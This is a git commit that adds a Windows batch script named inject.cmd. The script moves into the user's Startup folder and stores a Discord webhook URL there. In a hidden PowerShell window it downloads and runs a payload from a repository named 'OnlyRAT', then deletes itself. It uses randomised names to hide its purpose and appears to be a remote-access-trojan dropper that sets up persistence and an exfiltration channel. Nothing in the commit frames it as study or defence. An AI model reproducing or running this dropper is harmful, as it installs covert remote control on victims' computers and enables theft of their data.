42eb2d81d4c565a05c13772772cafc1edff64ab2
blousekool <132397759+blousekool@users.noreply.github.com>
2023-05-18 14:18:00 +0200

    inject.cmd

--- bd/inject.cmd
+++ bd/inject.cmd
@@ -1,1 +1,9 @@
-
+@echo off
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+echo https://discord.com/api/webhooks/1108692581765894185/VJnWWFYNCH-kNIS1wdrooCWhPViOiDj7zS76jdp3HS_bC4LfPuxrZxxSTzC9jR2V9BOf > lawFvVTikZ.txt
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
+powershell ./wEaoFkNduy.cmd
+cd "%XNjFYKECht%"
+del inject.cmd
